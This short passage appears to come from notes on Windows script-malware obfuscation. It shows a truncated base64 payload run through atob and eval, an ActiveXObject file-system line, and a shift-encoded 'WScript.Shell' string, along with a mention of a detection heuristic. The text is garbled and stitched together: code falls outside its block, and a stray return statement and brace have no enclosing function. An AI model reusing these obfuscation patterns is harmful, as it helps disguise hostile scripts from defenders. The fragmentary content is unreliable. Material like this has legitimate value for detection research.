VARIANT 1: BASE64 OBFUSCATION

Technique Overview:

  - Executed via eval() statement

Obfuscation Code:
```javascript
var b64Payload = "dmFyIHNoZWxsID0gbmV3IEFjdGl2ZVhPYmplY3Q...";
var decodedScript = atob(b64Payload);

```

  var fso = new ActiveXObject("Scripting.FileSystemObject");

Strengths:
  ✓ Simple, compact encoding

  - Base64 strings with ASCII printable ratio detection

    return result;
}

var ObjectA = String_Decode("ByDsjqu.Tibfm");  // WScript.Shell
